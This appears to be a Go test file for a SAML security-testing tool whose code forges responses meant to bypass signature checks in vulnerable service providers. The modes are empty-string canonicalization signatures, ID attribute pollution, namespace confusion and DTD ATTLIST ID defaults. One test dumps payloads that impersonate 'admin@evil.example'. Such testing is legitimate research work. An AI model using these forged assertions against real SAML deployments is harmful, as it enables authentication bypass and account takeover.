package saml

import (
	"crypto"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/beevik/etree"
	dsig "github.com/russellhaering/goxmldsig"
)

// emptyStringDigestFixed is base64(sha256("")). Hardcoded rather than
// recomputed: if the void recipe ever changes, that has to show up in the diff.
const emptyStringDigestFixed = "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU="

// fullResponse builds a SAML response complete enough for a real SP to validate
// end to end: destination, audience, conditions and subject confirmation, not
// just a signature. A fixture missing those passes the Go tests and then tells
// you nothing when you feed it to an actual implementation.
func fullResponse(t *testing.T, key *rsa.PrivateKey, cert *x509.Certificate, nameID string, signResponse bool) []byte {
	t.Helper()

	now := time.Now().UTC()
	stamp := now.Format("2006-01-02T15:04:05Z")
	future := now.Add(24 * time.Hour).Format("2006-01-02T15:04:05Z")
	past := now.Add(-5 * time.Minute).Format("2006-01-02T15:04:05Z")

	const (
		acs      = "http://localhost:3000/saml/consume"
		audience = "http://localhost:3000/saml/metadata"
		issuer   = "http://localhost:7007/saml/metadata"
	)

	doc := etree.NewDocument()
	doc.CreateProcInst("xml", `version="1.0" encoding="UTF-8"`)
	response := doc.CreateElement("samlp:Response")
	response.CreateAttr("xmlns:samlp", samlpNS)
	response.CreateAttr("xmlns:saml", samlNS)
	response.CreateAttr("ID", "_response1")
	response.CreateAttr("Version", "2.0")
	response.CreateAttr("IssueInstant", stamp)
	response.CreateAttr("Destination", acs)
	response.CreateElement("saml:Issuer").SetText(issuer)

	status := response.CreateElement("samlp:Status")
	status.CreateElement("samlp:StatusCode").CreateAttr("Value", "urn:oasis:names:tc:SAML:2.0:status:Success")

	// Declared on the assertion itself: it is signed standalone, before being
	// attached, so its canonical form has to be self-contained.
	assertion := etree.NewElement("saml:Assertion")
	assertion.CreateAttr("xmlns:saml", samlNS)
	assertion.CreateAttr("ID", "_assertion1")
	assertion.CreateAttr("Version", "2.0")
	assertion.CreateAttr("IssueInstant", stamp)
	assertion.CreateElement("saml:Issuer").SetText(issuer)

	subject := assertion.CreateElement("saml:Subject")
	nid := subject.CreateElement("saml:NameID")
	nid.CreateAttr("Format", "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress")
	nid.SetText(nameID)
	sc := subject.CreateElement("saml:SubjectConfirmation")
	sc.CreateAttr("Method", "urn:oasis:names:tc:SAML:2.0:cm:bearer")
	scd := sc.CreateElement("saml:SubjectConfirmationData")
	scd.CreateAttr("NotOnOrAfter", future)
	scd.CreateAttr("Recipient", acs)

	conditions := assertion.CreateElement("saml:Conditions")
	conditions.CreateAttr("NotBefore", past)
	conditions.CreateAttr("NotOnOrAfter", future)
	conditions.CreateElement("saml:AudienceRestriction").CreateElement("saml:Audience").SetText(audience)

	authn := assertion.CreateElement("saml:AuthnStatement")
	authn.CreateAttr("AuthnInstant", stamp)
	authn.CreateAttr("SessionIndex", "_session1")
	authn.CreateElement("saml:AuthnContext").
		CreateElement("saml:AuthnContextClassRef").
		SetText("urn:oasis:names:tc:SAML:2.0:ac:classes:Password")

	signElement(t, assertion, key, cert)
	response.AddChild(assertion)

	if signResponse {
		signElement(t, response, key, cert)
	}

	out, err := doc.WriteToBytes()
	if err != nil {
		t.Fatalf("serialize fixture: %v", err)
	}
	return out
}

// signElement signs el in place, leaving the signature directly after Issuer
// the way the schema wants it. It grafts a copy of the signature onto the
// original element rather than using the copy SignEnveloped returns, because
// goxmldsig appends its signature straight into etree's child slice without
// setting the parent pointer, so RemoveChild cannot detach it from there.
func signElement(t *testing.T, el *etree.Element, key *rsa.PrivateKey, cert *x509.Certificate) {
	t.Helper()
	ctx := dsig.NewDefaultSigningContext(keyStoreFor(key, cert))
	ctx.Canonicalizer = dsig.MakeC14N10ExclusiveCanonicalizerWithPrefixList("")
	if err := ctx.SetSignatureMethod(dsig.RSASHA256SignatureMethod); err != nil {
		t.Fatalf("set signature method: %v", err)
	}
	signed, err := ctx.SignEnveloped(el)
	if err != nil {
		t.Fatalf("sign %s: %v", el.Tag, err)
	}
	sig := findSignature(signed)
	if sig == nil {
		t.Fatalf("signing %s produced no signature", el.Tag)
	}
	el.InsertChildAt(issuerIndex(el), sig.Copy())
}

func TestParserDiffRejectsUnknownMode(t *testing.T) {
	key, cert := realIDPMaterial(t)
	p := NewParserDiffer(key, cert)
	if _, _, err := p.Apply(fullResponse(t, key, cert, "alice@example.com", false), "nope"); err == nil {
		t.Fatal("expected an unknown mode to be rejected")
	}
}

// The ordering slice, the label map and the help map are all derived from one
// table. Pin them together so a half-added mode cannot reach the UI.
func TestParserDiffModeTablesAgree(t *testing.T) {
	validated := 0
	for _, spec := range parserDiffSpecs {
		if spec.validated {
			validated++
		}
	}
	if len(ParserDiffModes) != validated {
		t.Fatalf("ParserDiffModes has %d entries, %d specs are validated", len(ParserDiffModes), validated)
	}
	if validated == 0 {
		t.Fatal("no mode is offered at all")
	}
	for _, mode := range ParserDiffModes {
		if !IsParserDiffMode(mode) {
			t.Errorf("mode %q is offered but not accepted by IsParserDiffMode", mode)
		}
		if ParserDiffModeLabels[mode] == "" {
			t.Errorf("mode %q has no label", mode)
		}
		if ParserDiffModeHelp[mode] == "" {
			t.Errorf("mode %q has no help text", mode)
		}
		spec, ok := lookupParserDiffSpec(mode)
		if !ok || spec.build == nil {
			t.Errorf("mode %q has no builder", mode)
		}
	}
	if IsParserDiffMode("") {
		t.Error("the empty mode must not validate as a mode")
	}
}

// Only payloads shown to bypass a real vulnerable implementation are offered,
// so the offered set and the validated flags have to agree and Apply has to
// refuse the rest.
func TestOnlyValidatedModesAreOffered(t *testing.T) {
	for _, spec := range parserDiffSpecs {
		offered := IsParserDiffMode(spec.mode)
		if offered != spec.validated {
			t.Errorf("mode %q: offered=%v but validated=%v", spec.mode, offered, spec.validated)
		}
	}
	key, cert := realIDPMaterial(t)
	in := fullResponse(t, key, cert, "alice@example.com", true)
	for _, spec := range parserDiffSpecs {
		if spec.validated {
			continue
		}
		if _, _, err := NewParserDiffer(key, cert).Apply(in, spec.mode); err == nil {
			t.Errorf("Apply accepted the unvalidated mode %q", spec.mode)
		}
	}
}

func TestParserDiffUsesDoctype(t *testing.T) {
	for _, spec := range parserDiffSpecs {
		want := spec.mode == ParserDiffDTDAttlist
		if got := ParserDiffUsesDoctype(spec.mode); got != want {
			t.Errorf("ParserDiffUsesDoctype(%q) = %v, want %v", spec.mode, got, want)
		}
	}
	if ParserDiffUsesDoctype("") {
		t.Error("the off mode prepends no DOCTYPE")
	}
}

func voidOutput(t *testing.T, signResponse bool) ([]byte, *rsa.PrivateKey, *x509.Certificate) {
	t.Helper()
	key, cert := realIDPMaterial(t)
	in := fullResponse(t, key, cert, "alice@example.com", signResponse)
	out, _, err := NewParserDiffer(key, cert).Apply(in, ParserDiffVoidC14N)
	if err != nil {
		t.Fatalf("apply void_c14n: %v", err)
	}
	return out, key, cert
}

func TestVoidC14NDigestIsEmptyStringHash(t *testing.T) {
	out, _, _ := voidOutput(t, false)
	doc := etree.NewDocument()
	if err := doc.ReadFromBytes(out); err != nil {
		t.Fatalf("reparse: %v", err)
	}
	found := 0
	for _, dv := range doc.Root().FindElements("//DigestValue") {
		found++
		if dv.Text() != emptyStringDigestFixed {
			t.Errorf("DigestValue = %q, want the empty-string hash %q", dv.Text(), emptyStringDigestFixed)
		}
	}
	if found == 0 {
		t.Fatal("no DigestValue in the output")
	}
}

// This is the test that proves the attack: the signature the SP checks covers
// the empty string, so it says nothing about the document it arrived in.
func TestVoidC14NSignatureVerifiesOverEmptyString(t *testing.T) {
	out, _, cert := voidOutput(t, false)
	doc := etree.NewDocument()
	if err := doc.ReadFromBytes(out); err != nil {
		t.Fatalf("reparse: %v", err)
	}
	sv := doc.Root().FindElement("//SignatureValue")
	if sv == nil {
		t.Fatal("no SignatureValue in the output")
	}
	sig, err := base64.StdEncoding.DecodeString(strings.Join(strings.Fields(sv.Text()), ""))
	if err != nil {
		t.Fatalf("decode SignatureValue: %v", err)
	}
	sum := sha256.Sum256(nil)
	pub, ok := cert.PublicKey.(*rsa.PublicKey)
	if !ok {
		t.Fatal("IdP certificate does not carry an RSA key")
	}
	if err := rsa.VerifyPKCS1v15(pub, crypto.SHA256, sum[:], sig); err != nil {
		t.Fatalf("signature does not verify over the empty string: %v", err)
	}
}

// The void mode signs as the IdP so the SP's configured certificate matches; a
// rejection then says something about canonicalization rather than about trust.
func TestVoidC14NKeepsTheRealIdPCertificate(t *testing.T) {
	out, _, cert := voidOutput(t, false)
	doc := etree.NewDocument()
	if err := doc.ReadFromBytes(out); err != nil {
		t.Fatalf("reparse: %v", err)
	}
	assertion := findElement(doc.Root(), "saml", "Assertion")
	if assertion == nil {
		t.Fatal("no assertion in the output")
	}
	got := keyInfoCert(t, assertion)
	if !got.Equal(cert) {
		t.Error("void_c14n must present the real IdP certificate, not attacker material")
	}
}

func TestVoidC14NDeclaresPrefixedRelativeNamespace(t *testing.T) {
	out, _, _ := voidOutput(t, false)
	text := string(out)
	// Prefixed, not a default declaration: libxml2 only warns about a relative
	// URI on a default xmlns, and that warning makes ruby-saml's malformed
	// document check reject the response before the attack is reached.
	if !strings.Contains(text, `xmlns:plasmid="1"`) {
		t.Errorf("output is missing the relative namespace declaration:\n%s", text)
	}
	if strings.Contains(text, `xmlns="1"`) {
		t.Error("the relative namespace must be prefixed, never a default declaration")
	}
}

// Negative control. A strict verifier has to reject this; if it ever starts
// passing we have accidentally produced a genuinely valid signature and the
// mode proves nothing about the SP.
func TestVoidC14NIsRejectedByAStrictVerifier(t *testing.T) {
	out, _, cert := voidOutput(t, false)
	doc := etree.NewDocument()
	if err := doc.ReadFromBytes(out); err != nil {
		t.Fatalf("reparse: %v", err)
	}
	assertion := findElement(doc.Root(), "saml", "Assertion")
	if assertion == nil {
		t.Fatal("no assertion in the output")
	}
	store := dsig.MemoryX509CertificateStore{Roots: []*x509.Certificate{cert}}
	vctx := dsig.NewDefaultValidationContext(&store)
	vctx.IdAttribute = "ID"
	if _, err := vctx.Validate(assertion); err == nil {
		t.Fatal("a strict verifier accepted the void signature")
	}
}

func TestVoidC14NPositionsSignatureAfterIssuer(t *testing.T) {
	out, _, _ := voidOutput(t, false)
	doc := etree.NewDocument()
	if err := doc.ReadFromBytes(out); err != nil {
		t.Fatalf("reparse: %v", err)
	}
	assertion := findElement(doc.Root(), "saml", "Assertion")
	children := assertion.ChildElements()
	if len(children) < 2 || children[0].Tag != "Issuer" || children[1].Tag != "Signature" {
		var tags []string
		for _, c := range children {
			tags = append(tags, c.Tag)
		}
		t.Errorf("signature is not directly after Issuer: %v", tags)
	}
}

func TestVoidC14NRequiresASignature(t *testing.T) {
	key, cert := realIDPMaterial(t)
	doc := etree.NewDocument()
	r := doc.CreateElement("samlp:Response")
	r.CreateAttr("xmlns:samlp", samlpNS)
	r.CreateAttr("ID", "_r")
	raw, err := doc.WriteToBytes()
	if err != nil {
		t.Fatalf("serialize: %v", err)
	}
	if _, _, err := NewParserDiffer(key, cert).Apply(raw, ParserDiffVoidC14N); err == nil {
		t.Fatal("expected an error for a response with no signature")
	}
}

func TestParserDiffNeedsKeyMaterial(t *testing.T) {
	key, cert := realIDPMaterial(t)
	in := fullResponse(t, key, cert, "alice@example.com", true)
	if _, _, err := NewParserDiffer(nil, nil).Apply(in, ParserDiffVoidC14N); err == nil {
		t.Fatal("expected an error when the key material is missing")
	}
}

// Every mode has to produce something that parses, and parses back to the same
// bytes, because later pipeline stages re-read the document.
func TestParserDiffModesRoundTrip(t *testing.T) {
	key, cert := realIDPMaterial(t)
	for _, spec := range parserDiffSpecs {
		mode := spec.mode
		t.Run(mode, func(t *testing.T) {
			in := fullResponse(t, key, cert, "alice@example.com", true)
			out, desc, err := NewParserDiffer(key, cert).applyWith(in, mode, defaultParserDiffOptions)
			if err != nil {
				t.Fatalf("apply %s: %v", mode, err)
			}
			if desc == "" {
				t.Error("no description recorded")
			}
			doc := etree.NewDocument()
			if err := doc.ReadFromBytes(out); err != nil {
				t.Fatalf("output does not reparse: %v\n%s", err, out)
			}
			if doc.Root() == nil {
				t.Fatal("output has no root element")
			}
			again, err := doc.WriteToBytes()
			if err != nil {
				t.Fatalf("reserialize: %v", err)
			}
			if string(again) != string(out) {
				t.Error("output is not byte-stable across a reparse")
			}
		})
	}
}

func TestAttrPollutionOrdersIDAttributes(t *testing.T) {
	key, cert := realIDPMaterial(t)
	in := fullResponse(t, key, cert, "alice@example.com", true)
	out, _, err := NewParserDiffer(key, cert).applyWith(in, ParserDiffAttrPollution, defaultParserDiffOptions)
	if err != nil {
		t.Fatalf("apply attr_pollution: %v", err)
	}
	// The ordering is the payload: libxml2 resolves an unqualified @ID lookup to
	// the first attribute whose local name matches, whatever its prefix. So the
	// assertion belongs at byte level, not on the parsed tree.
	text := string(out)
	prefixed := strings.Index(text, `samlp:ID="`)
	plain := strings.Index(text, ` ID="`)
	if prefixed < 0 {
		t.Fatalf("no samlp:ID in the output:\n%s", text[:min(len(text), 400)])
	}
	if plain < 0 {
		t.Fatalf("no plain ID in the output:\n%s", text[:min(len(text), 400)])
	}
	if prefixed > plain {
		t.Errorf("samlp:ID must precede ID; got prefixed at %d, plain at %d", prefixed, plain)
	}
}

func TestAttrPollutionIDsMatchTheSignedReference(t *testing.T) {
	key, cert := realIDPMaterial(t)
	in := fullResponse(t, key, cert, "alice@example.com", true)
	out, _, err := NewParserDiffer(key, cert).applyWith(in, ParserDiffAttrPollution, defaultParserDiffOptions)
	if err != nil {
		t.Fatalf("apply attr_pollution: %v", err)
	}
	doc := etree.NewDocument()
	if err := doc.ReadFromBytes(out); err != nil {
		t.Fatalf("reparse: %v", err)
	}
	response := doc.Root()
	want, err := signedElementID(response)
	if err != nil {
		t.Fatalf("signed element id: %v", err)
	}
	for _, attr := range response.Attr {
		if attr.Key == "ID" && attr.Value != want {
			t.Errorf("%s:ID = %q, want the signed reference %q", attr.Space, attr.Value, want)
		}
	}
}

func TestNSConfusionEmitsXMLXmlnsVerbatim(t *testing.T) {
	key, cert := realIDPMaterial(t)
	in := fullResponse(t, key, cert, "alice@example.com", true)
	out, _, err := NewParserDiffer(key, cert).applyWith(in, ParserDiffNSConfusion, defaultParserDiffOptions)
	if err != nil {
		t.Fatalf("apply ns_confusion: %v", err)
	}
	text := string(out)
	if !strings.Contains(text, `xml:xmlns="http://www.w3.org/2000/09/xmldsig_#"`) {
		t.Error("xml:xmlns was not emitted verbatim")
	}
	if !strings.Contains(text, "StatusDetail") {
		t.Error("the decoy is not inside StatusDetail")
	}
	// The real signature has to survive in its schema-valid position, or a
	// strict SP rejects the document before it evaluates any of this.
	doc := etree.NewDocument()
	if err := doc.ReadFromBytes(out); err != nil {
		t.Fatalf("reparse: %v", err)
	}
	if findSignature(doc.Root()) == nil {
		t.Error("the response lost its real signature")
	}
}

func TestDTDAttlistRemovesLiteralIDAndAddsDoctype(t *testing.T) {
	key, cert := realIDPMaterial(t)
	in := fullResponse(t, key, cert, "alice@example.com", true)
	out, _, err := NewParserDiffer(key, cert).applyWith(in, ParserDiffDTDAttlist, defaultParserDiffOptions)
	if err != nil {
		t.Fatalf("apply dtd_attlist: %v", err)
	}
	text := string(out)
	if !strings.Contains(text, "<!ATTLIST samlp:Response ID CDATA #FIXED") {
		t.Errorf("no unescaped ATTLIST in the output:\n%s", text[:min(len(text), 400)])
	}
	if strings.Contains(text, "&lt;!ATTLIST") || strings.Contains(text, "&quot;") {
		t.Error("the DOCTYPE was escaped; it has to be emitted verbatim")
	}
	doc := etree.NewDocument()
	if err := doc.ReadFromBytes(out); err != nil {
		t.Fatalf("reparse: %v", err)
	}
	if got := doc.Root().SelectAttrValue("ID", ""); got != "" {
		t.Errorf("the literal ID attribute survived (%q); only the DTD default may supply it", got)
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// TestDumpParserDiffPayloads writes each mode's output where an external
// validation bench can pick it up. It is a no-op unless PLASMID_DUMP_DIR is
// set, because the only way to know a payload really trips a parser is to run
// it against a vulnerable implementation.
func TestDumpParserDiffPayloads(t *testing.T) {
	dir := os.Getenv("PLASMID_DUMP_DIR")
	if dir == "" {
		t.Skip("set PLASMID_DUMP_DIR to dump payloads for the validation bench")
	}
	key, cert := realIDPMaterial(t)

	certPath := filepath.Join(dir, "idp-cert.pem")
	pemBytes := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: cert.Raw})
	if err := os.WriteFile(certPath, pemBytes, 0o644); err != nil {
		t.Fatalf("write cert: %v", err)
	}

	for _, signResponse := range []bool{false, true} {
		suffix := "-assertion-signed"
		if signResponse {
			suffix = "-both-signed"
		}
		baseline := fullResponse(t, key, cert, "alice@example.com", signResponse)
		if err := os.WriteFile(filepath.Join(dir, "baseline"+suffix+".xml"), baseline, 0o644); err != nil {
			t.Fatalf("write baseline: %v", err)
		}
		for _, spec := range parserDiffSpecs {
			mode := spec.mode
			in := fullResponse(t, key, cert, "admin@evil.example", signResponse)
			out, desc, err := NewParserDiffer(key, cert).applyWith(in, mode, defaultParserDiffOptions)
			if err != nil {
				t.Logf("%s%s: %v", mode, suffix, err)
				continue
			}
			path := filepath.Join(dir, mode+suffix+".xml")
			if err := os.WriteFile(path, out, 0o644); err != nil {
				t.Fatalf("write %s: %v", path, err)
			}
			t.Logf("wrote %s (%s)", path, desc)
		}
	}
	t.Logf("cert: %s", certPath)
}
